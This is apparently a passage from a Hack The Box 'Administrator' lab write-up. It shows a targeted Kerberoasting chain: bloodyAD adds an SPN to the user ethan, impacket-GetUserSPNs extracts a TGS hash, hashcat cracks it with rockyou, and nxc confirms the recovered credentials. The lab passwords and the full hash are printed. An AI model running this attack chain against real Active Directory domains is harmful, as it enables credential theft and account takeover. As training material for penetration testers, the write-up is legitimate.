

### Step 1 - Add a SPN to attribute to the targeted account

`bloodyAD -d "administrator.htb" --host "10.129.229.8" -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" set object "ethan" servicePrincipalName -v 'Hello/Hello'`

```sh
┌──(administrator)─(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ bloodyAD -d "administrator.htb" --host "10.129.229.8" -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" set object "ethan" servicePrincipalName -v 'Hello/Hello'
[+] ethan's servicePrincipalName has been updated
```

### Step 2 - Get user hash

`impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.129.229.8 -dc-host dc.administrator.htb -request-user ethan`

```sh
┌──(administrator)─(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.129.229.8 -dc-host dc.administrator.htb -request-user ethan
/home/fixit42/boxes/htb/administrator/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
Hello/Hello           ethan            2024-10-12 22:52:14.117811  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$190b1583b8405e5fa411880a22c12693$a96664afa24f4eb51f63054a5c44355620b335e52574ed90c64984c708895a8e130a9518521e80784bcc2dfd5fb74b79ffd520eab5edfc0530cddd56b3f024372a72aa00a779b6785cfba680227c942d5ef190c8333d392c72326effce9b653ae25866726d81fbb2beaa0fa854d462cdc27a1cbc2a8a0f0013087df7022353e1be20de1e82d6ea8bca6b8236fdf62e94575defdf8a979c4dc924bab10ada4dba435714113fe3cdfe3c2b28882ad63266d169721d5a3a282fe6ca9c0a2773df8c8abecd17393199c8bac92d6d5ab6fc0a15b9e81a0ebe6ee63c8f3f0f4acee369eeeed8c42e555eaa1366f1af8a5ed7e6395956f21db61070e15a4b015df72a536ad5eddf7a04d5ee1a13d2098e31585576a33447ac1d8e542d76548727a5ecd12f8035d58775535f61123442c0925c746ba99e417222def6326097d00037ef45539dc92c3480277f59c6f2e69fedda6304d137b31094a20b5dc5b0bd62f2ec680523ec9070fb58112c1decd00a28a5c4586f8312d7a2791f956c72abe968956060f92580722ea0f73c2fa1fb8984f6ee42314d22ede997314e8abbaab6c17c17caa9e41707753e6097abd5bdcca6724849315d4d52b056fd696d1dfd475c27a7d9109e9c14c1162651d5bbec2ced3ad24d85a472ce1564fa6862bdadb7eb04f3621872e7fc3fa6ec1d16aca79b7a275c48640bdc4af260689576357079908e83b72b1ed88f6ab23ed495b5b9fcad579c9c14985f7483a48a9a263e78ad69d6d857f3fd690decf421878e26904910e09452c4b033c47b71e1ac28513559af179d55d2b31b26e357f7a6c94ee08e9fb545330e421ad2135de2bf31c2b3d0966e458be740199f217b093c59174c39beb9c20d64cadefa20802177bbe54df0b86b5805581ff7ec07880910b2e25814f2d58ed4511f7d6bc4fcefb415baf052e427738669fd61609e57f085c3d3699368d17d81b513071bf3d73b41198949ed7ce596f303381f1da56ceb92d4f5ba3d64202c5affc9a92b35f981432e65b4683986665b50e669f1ba0eeb475b9536adfc99299ddf02938baf53345a12a01d42853071fff36b054702d60fb7ff16f567969fc7823f0d54aea5b971d91f382ba669ce2e47cbf0f014b6de442f74e413a106443096bae310661c8c9240683e4a6e06b1bfb7a7ad94a791bb7a67187c150a871c96c06bfd57b1de0ab19acd9d2d744a64c6bc2abd462983c54402999e615d1ed8fcabf30cbfbdb12a0727aa1bf66096d1425f517c30fd5e5e6eb637f9a81b85a4e99e4d8e3b4c3644c68f00dfe1c2f3a64622221fe8334df31590b68c13089ae839c66523eefe943c14a8756a22941c819a9a421b0c37ef0975b8c6ce3dd395802864a74f59d81e74615826e89bf60d590696d15ec9454bfcb179110002bd87a7e2628d4f0e92f6678a32668069d6522e1418703ea9bb9426edc55d80dd6c614396c7c1f6223db1c41e2465a20cba2d3c4cb37bc21435d61c49bc887328237adf3d8323ab572c44781f001795cc927c43
```

```sh
┌──(administrator)─(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ nano ethan.hash
```

```sh
┌──(administrator)─(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ hashcat ethan.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, 2898/5861 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$190b1583b8405e5fa411880a22c12693$a96664afa24f4eb51f63054a5c44355620b335e52574ed90c64984c708895a8e130a9518521e80784bcc2dfd5fb74b79ffd520eab5edfc0530cddd56b3f024372a72aa00a779b6785cfba680227c942d5ef190c8333d392c72326effce9b653ae25866726d81fbb2beaa0fa854d462cdc27a1cbc2a8a0f0013087df7022353e1be20de1e82d6ea8bca6b8236fdf62e94575defdf8a979c4dc924bab10ada4dba435714113fe3cdfe3c2b28882ad63266d169721d5a3a282fe6ca9c0a2773df8c8abecd17393199c8bac92d6d5ab6fc0a15b9e81a0ebe6ee63c8f3f0f4acee369eeeed8c42e555eaa1366f1af8a5ed7e6395956f21db61070e15a4b015df72a536ad5eddf7a04d5ee1a13d2098e31585576a33447ac1d8e542d76548727a5ecd12f8035d58775535f61123442c0925c746ba99e417222def6326097d00037ef45539dc92c3480277f59c6f2e69fedda6304d137b31094a20b5dc5b0bd62f2ec680523ec9070fb58112c1decd00a28a5c4586f8312d7a2791f956c72abe968956060f92580722ea0f73c2fa1fb8984f6ee42314d22ede997314e8abbaab6c17c17caa9e41707753e6097abd5bdcca6724849315d4d52b056fd696d1dfd475c27a7d9109e9c14c1162651d5bbec2ced3ad24d85a472ce1564fa6862bdadb7eb04f3621872e7fc3fa6ec1d16aca79b7a275c48640bdc4af260689576357079908e83b72b1ed88f6ab23ed495b5b9fcad579c9c14985f7483a48a9a263e78ad69d6d857f3fd690decf421878e26904910e09452c4b033c47b71e1ac28513559af179d55d2b31b26e357f7a6c94ee08e9fb545330e421ad2135de2bf31c2b3d0966e458be740199f217b093c59174c39beb9c20d64cadefa20802177bbe54df0b86b5805581ff7ec07880910b2e25814f2d58ed4511f7d6bc4fcefb415baf052e427738669fd61609e57f085c3d3699368d17d81b513071bf3d73b41198949ed7ce596f303381f1da56ceb92d4f5ba3d64202c5affc9a92b35f981432e65b4683986665b50e669f1ba0eeb475b9536adfc99299ddf02938baf53345a12a01d42853071fff36b054702d60fb7ff16f567969fc7823f0d54aea5b971d91f382ba669ce2e47cbf0f014b6de442f74e413a106443096bae310661c8c9240683e4a6e06b1bfb7a7ad94a791bb7a67187c150a871c96c06bfd57b1de0ab19acd9d2d744a64c6bc2abd462983c54402999e615d1ed8fcabf30cbfbdb12a0727aa1bf66096d1425f517c30fd5e5e6eb637f9a81b85a4e99e4d8e3b4c3644c68f00dfe1c2f3a64622221fe8334df31590b68c13089ae839c66523eefe943c14a8756a22941c819a9a421b0c37ef0975b8c6ce3dd395802864a74f59d81e74615826e89bf60d590696d15ec9454bfcb179110002bd87a7e2628d4f0e92f6678a32668069d6522e1418703ea9bb9426edc55d80dd6c614396c7c1f6223db1c41e2465a20cba2d3c4cb37bc21435d61c49bc887328237adf3d8323ab572c44781f001795cc927c43:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....927c43
Time.Started.....: Wed Aug 13 23:55:46 2025 (0 secs)
Time.Estimated...: Wed Aug 13 23:55:46 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    35689 H/s (1.46ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 52%

Started: Wed Aug 13 23:54:38 2025
Stopped: Wed Aug 13 23:55:48 2025
```

we got ethan:limpbizkit

confirmation:
```sh
┌──(administrator)─(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ nxc smb 10.129.229.8 -u 'ethan' -p 'limpbizkit' --shares 
SMB         10.129.229.8    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.8    445    DC               [+] administrator.htb\ethan:limpbizkit 
SMB         10.129.229.8    445    DC               [*] Enumerated shares
SMB         10.129.229.8    445    DC               Share           Permissions     Remark
SMB         10.129.229.8    445    DC               -----           -----------     ------
SMB         10.129.229.8    445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.8    445    DC               C$                              Default share
SMB         10.129.229.8    445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.8    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.8    445    DC               SYSVOL          READ            Logon server share
```

Alt 2 for step 2

`nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -H "$NThash" --kerberoasting kerberoastables.txt`

